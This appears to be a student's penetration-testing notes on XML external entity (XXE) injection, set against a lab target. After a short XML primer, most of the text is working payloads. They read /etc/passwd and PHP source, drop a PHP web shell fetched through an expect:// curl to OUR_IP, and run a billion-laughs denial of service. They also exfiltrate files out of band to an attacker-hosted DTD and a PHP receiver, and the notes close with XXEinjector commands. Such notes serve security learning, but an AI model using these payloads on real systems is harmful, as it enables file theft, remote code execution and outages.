## What is XML 
**eXtensible Mark Up language**
Used for storing and transporting data. 
### Example Message

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

|Key|Definition|Example|
|---|---|---|
|`Tag`|The keys of an XML document, usually wrapped with (`<`/`>`) characters.|`<date>`|
|`Entity`|XML variables, usually wrapped with (`&`/`;`) characters.|`&lt;`|
|`Element`|The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.|`<date>01-01-2022</date>`|
|`Attribute`|Optional specifications for any element that are stored in the tags, which may be used by the XML parser.|`version="1.0"`/`encoding="UTF-8"`|
| `Declaration` | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. | `<?xml version="1.0" encoding="UTF-8"?>`                                                                                                           |                                          |
### XML Entities 
* XML Document Type Definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it contains and other items.
* The DTD gets declared in DOCTYPE element at the start of the document.
```xml
<!DOCTYPE example [ <!ENTITY custom "value"> ]>
```
Any value of `custom entity` will be replaced with `value`

#### External Entities
* Entities located outside of the DTD
* use the `SYSTEM` key word
```XML
<!DOCTYPE example [<!ENTITY example SYSTEM "file://example_file">]>
```

# External XML Injection (XXE)
* Allows an attacker to interfere with processing of XML data
```XMLL
<!DOCTYPE example [<!ENTITY example SYSTEM "file:///etc/passwd">]>
```
## Local File Disclosure
#### Identifying 
Find a web page that accepts XML input and intercept the request with a proxy.
Look at what elements are being displayed in the XML so you no what to inject.
##### Example Injection 
Place at the top
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
Place in injection field
```xml
&company;
```
If the `DOCTYPE` is already declared you will need to add the `ENTITY` element

If the HTTP response shows the company then you know that it is vulnerable to XXE. 
* [May need to convert XML to json](https://www.convertjson.com/json-to-xml.htm)

#### Reading Files
Place at the top
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
Place in the vulnerable field
```xml
&company;
```
##### Reading source code
Try:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file://index.php">
]>
```
Alternate:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```


## Remote Code Execution
Easiest way is to look for ssh keys or passwords.
```shell
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
Injection 
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
* Need the `except module` to be enabled.
* `$IFS` avoid breaking the XML
## Other Attacks 
#### Denial Of service 
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```
## Advanced File Disclosure 
### Advanced Ex filtration with CDATA
* Data that does not conform with to an XML format needs to be wrapped with a `CDATA` tag
* Ensures the XML interprets it as RAW data.
* `<![CDATA[CONTENT]]>`

```shell 
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
```
**XML prevents internal and external joining as such if we reference them from an external source we can join them**
This often require converting to base64

### Error Based XXE
* XML does not return any output
* If the web application displays runtime errors and does not have exception handling, then we can use this flaw to read the output. 

 Payload in xxe.dtd:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```shell
python3 -m http.server 8000
```

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

## Blind Data Exfiltration

### Out-of-band (OOB) Data Ex-filtration
* Make the web page send the request to our web server 
* Loads the file into base64 and sends it to our web server
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

PHP Script that automatically decodes the base64:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
Save to index.php

```shell
php -S 0.0.0.0:8000
```

### Automated OOB Exfilitration
[XXEInjector](https://github.com/enjoiz/XXEinjector)
```shell
git clone https://github.com/enjoiz/XXEinjector.git
```

Copy the HTTP request with only the **1st** XML line. Then add `XXEINJECT` below
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```shell
ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

Ex-filtrated data gets stored in the Logs folder.
